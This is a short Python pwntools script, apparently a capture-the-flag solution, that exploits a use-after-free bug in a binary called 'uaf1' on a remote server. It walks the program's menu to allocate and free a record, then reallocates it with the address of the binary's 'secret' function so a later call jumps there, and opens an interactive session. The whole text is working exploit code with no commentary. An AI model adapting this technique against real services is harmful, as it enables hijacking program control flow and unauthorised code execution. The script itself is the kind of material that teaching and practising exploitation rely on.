from pwn import *

context.binary = elf  = ELF("./uaf1")
# p = process("./uaf1")
p = remote("ec2-3-1-204-6.ap-southeast-1.compute.amazonaws.com", 10924)

p.sendlineafter(b">> ", b"1")
p.sendlineafter(b"name:\n", b"AAAAAAAABBBBBBBB")
p.sendlineafter(b">> ", b"5")
p.sendlineafter(b">> ", b"2")
p.sendlineafter(b"name:\n", p64(elf.sym.secret) + b"BBBBBBBB")
# gdb.attach(p)
p.sendlineafter(b">> ", b"3")


p.interactive()
